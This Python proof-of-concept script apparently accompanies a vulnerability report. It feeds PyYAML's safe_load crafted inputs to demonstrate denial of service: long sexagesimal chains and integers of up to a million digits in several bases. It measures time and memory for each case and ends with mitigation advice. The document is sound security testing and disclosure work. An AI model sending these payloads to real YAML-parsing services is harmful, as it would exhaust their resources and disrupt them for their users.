#!/usr/bin/env python3
"""
VULN-006: Integer Parsing DoS (Sexagesimal and Large Numbers)
Severity: MEDIUM
Type: Denial of Service (CPU/Memory Exhaustion)

This vulnerability allows attackers to cause CPU and memory exhaustion
through specially crafted integer values using YAML 1.1's sexagesimal
notation or extremely large numbers.
"""

import sys
import os
import time
import tracemalloc

# Add the lib directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'lib'))

import yaml


def test_sexagesimal_integer_explosion():
    """
    Test CPU exhaustion through sexagesimal integer parsing.

    YAML 1.1 supports base-60 notation like 1:2:3:4:5
    Each colon-separated segment multiplies by 60.

    Value = d0 + d1*60 + d2*60^2 + d3*60^3 + ...

    A string like "59:59:59:59:59" (15 chars) =
    59 + 59*60 + 59*3600 + 59*216000 + 59*12960000 = 777,599,999
    """

    print("=" * 60)
    print("VULN-006: Sexagesimal Integer Explosion")
    print("=" * 60)
    print()

    print("YAML 1.1 sexagesimal notation: value is base-60 encoded")
    print("Example: 1:2:3 = 1*3600 + 2*60 + 3 = 3723")
    print()

    # Test progressively longer sexagesimal numbers
    test_cases = [
        ("59:59", "2 segments"),
        ("59:59:59", "3 segments"),
        ("59:59:59:59", "4 segments"),
        ("59:59:59:59:59", "5 segments"),
        ("59:59:59:59:59:59", "6 segments"),
        ("59:59:59:59:59:59:59", "7 segments"),
        ("59:59:59:59:59:59:59:59", "8 segments"),
        ("59:59:59:59:59:59:59:59:59", "9 segments"),
        ("59:59:59:59:59:59:59:59:59:59", "10 segments"),
    ]

    for value, description in test_cases:
        payload = f"num: {value}"
        print(f"{description} ({len(value)} chars):")

        start = time.time()
        tracemalloc.start()

        try:
            result = yaml.safe_load(payload)
            elapsed = time.time() - start
            current, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()

            num = result['num']
            print(f"  Value: {num:,}")
            print(f"  Digits: {len(str(num)):,}")
            print(f"  Time: {elapsed:.6f}s")
            print(f"  Memory: {peak / 1024:.2f} KB")

        except Exception as e:
            tracemalloc.stop()
            print(f"  Error: {type(e).__name__}: {e}")

        print()


def test_large_integer_memory():
    """
    Test memory exhaustion through large integer values.

    Python integers can be arbitrarily large, but processing them
    requires proportional memory.
    """

    print("-" * 60)
    print("Large Integer Memory Exhaustion")
    print("-" * 60)
    print()

    # Test large decimal integers
    for num_digits in [100, 1000, 10000, 100000, 1000000]:
        value = "9" * num_digits
        payload = f"num: {value}"

        print(f"Decimal with {num_digits:,} digits:")
        print(f"  Payload size: {len(payload):,} bytes")

        start = time.time()
        tracemalloc.start()

        try:
            result = yaml.safe_load(payload)
            elapsed = time.time() - start
            current, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()

            print(f"  Time: {elapsed:.6f}s")
            print(f"  Memory: {peak / 1024 / 1024:.2f} MB")

        except MemoryError:
            tracemalloc.stop()
            print(f"  [!] MemoryError!")

        except Exception as e:
            tracemalloc.stop()
            print(f"  Error: {type(e).__name__}")

        print()


def test_large_hex_integer():
    """
    Test large hexadecimal integers.
    """

    print("-" * 60)
    print("Large Hexadecimal Integer Parsing")
    print("-" * 60)
    print()

    for num_digits in [100, 1000, 10000, 100000]:
        value = "0x" + "f" * num_digits
        payload = f"num: {value}"

        print(f"Hex with {num_digits:,} digits:")

        start = time.time()
        tracemalloc.start()

        try:
            result = yaml.safe_load(payload)
            elapsed = time.time() - start
            current, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()

            num = result['num']
            print(f"  Decimal digits: {len(str(num)):,}")
            print(f"  Time: {elapsed:.6f}s")
            print(f"  Memory: {peak / 1024 / 1024:.2f} MB")

        except Exception as e:
            tracemalloc.stop()
            print(f"  Error: {type(e).__name__}")

        print()


def test_large_binary_integer():
    """
    Test large binary integers.
    """

    print("-" * 60)
    print("Large Binary Integer Parsing")
    print("-" * 60)
    print()

    for num_bits in [1000, 10000, 100000, 1000000]:
        value = "0b" + "1" * num_bits
        payload = f"num: {value}"

        print(f"Binary with {num_bits:,} bits:")

        start = time.time()
        tracemalloc.start()

        try:
            result = yaml.safe_load(payload)
            elapsed = time.time() - start
            current, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()

            num = result['num']
            print(f"  Decimal digits: {len(str(num)):,}")
            print(f"  Time: {elapsed:.6f}s")
            print(f"  Memory: {peak / 1024 / 1024:.2f} MB")

        except Exception as e:
            tracemalloc.stop()
            print(f"  Error: {type(e).__name__}")

        print()


def test_large_octal_integer():
    """
    Test large octal integers.
    """

    print("-" * 60)
    print("Large Octal Integer Parsing")
    print("-" * 60)
    print()

    for num_digits in [1000, 10000, 100000]:
        value = "0" + "7" * num_digits
        payload = f"num: {value}"

        print(f"Octal with {num_digits:,} digits:")

        start = time.time()
        tracemalloc.start()

        try:
            result = yaml.safe_load(payload)
            elapsed = time.time() - start
            current, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()

            num = result['num']
            print(f"  Decimal digits: {len(str(num)):,}")
            print(f"  Time: {elapsed:.6f}s")
            print(f"  Memory: {peak / 1024 / 1024:.2f} MB")

        except Exception as e:
            tracemalloc.stop()
            print(f"  Error: {type(e).__name__}")

        print()


def test_sexagesimal_cpu_exhaustion():
    """
    Test CPU exhaustion with long sexagesimal chains.
    """

    print("-" * 60)
    print("Sexagesimal CPU Exhaustion (Long Chains)")
    print("-" * 60)
    print()

    # Create very long sexagesimal numbers
    for segments in [10, 20, 50, 100, 200]:
        # 59:59:59:... repeated
        value = ":".join(["59"] * segments)
        payload = f"num: {value}"

        print(f"Sexagesimal with {segments} segments ({len(value)} chars):")

        start = time.time()
        tracemalloc.start()

        try:
            result = yaml.safe_load(payload)
            elapsed = time.time() - start
            current, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()

            num = result['num']
            print(f"  Result digits: {len(str(num)):,}")
            print(f"  Time: {elapsed:.6f}s")
            print(f"  Memory: {peak / 1024 / 1024:.2f} MB")

            # Calculate expected value
            # 59 * sum(60^i for i in 0..segments-1) = 59 * (60^segments - 1) / 59
            expected_magnitude = 60 ** segments
            print(f"  Expected order of magnitude: 60^{segments} = ~10^{len(str(expected_magnitude))-1}")

        except Exception as e:
            elapsed = time.time() - start
            tracemalloc.stop()
            print(f"  Error after {elapsed:.2f}s: {type(e).__name__}")

        print()


def test_float_precision_attack():
    """
    Test float parsing with extreme values.
    """

    print("-" * 60)
    print("Float Precision and Range Attack")
    print("-" * 60)
    print()

    test_cases = [
        ("1e308", "near max float"),
        ("1e309", "overflow to inf"),
        ("1e-324", "near min positive"),
        ("1e-400", "underflow to 0"),
        ("1" + "0" * 1000 + ".0", "many integer digits"),
        ("0." + "0" * 1000 + "1", "many decimal places"),
    ]

    for value, description in test_cases:
        payload = f"num: {value}"
        print(f"{description}:")

        try:
            result = yaml.safe_load(payload)
            num = result['num']
            print(f"  Result: {num}")
        except Exception as e:
            print(f"  Error: {type(e).__name__}: {e}")

        print()


if __name__ == '__main__':
    print("PyYAML Integer Parsing DoS Test Suite")
    print("=" * 60)
    print()
    print("This test suite demonstrates denial-of-service attacks")
    print("through integer parsing in YAML.")
    print()

    test_sexagesimal_integer_explosion()
    test_large_integer_memory()
    test_large_hex_integer()
    test_large_binary_integer()
    test_large_octal_integer()
    test_sexagesimal_cpu_exhaustion()
    test_float_precision_attack()

    print("=" * 60)
    print("CONCLUSION")
    print("=" * 60)
    print()
    print("PyYAML is vulnerable to integer-based DoS attacks:")
    print()
    print("1. Sexagesimal notation creates exponentially large numbers")
    print("   from small input (e.g., '59:59:59:59:59' = 777,599,999)")
    print()
    print("2. Large decimal/hex/binary/octal integers can exhaust memory")
    print()
    print("3. No limits on integer size during parsing")
    print()
    print("RECOMMENDATIONS:")
    print("  - Limit the number of sexagesimal segments")
    print("  - Limit the total number of digits in integers")
    print("  - Add configuration options for these limits")
    print("=" * 60)
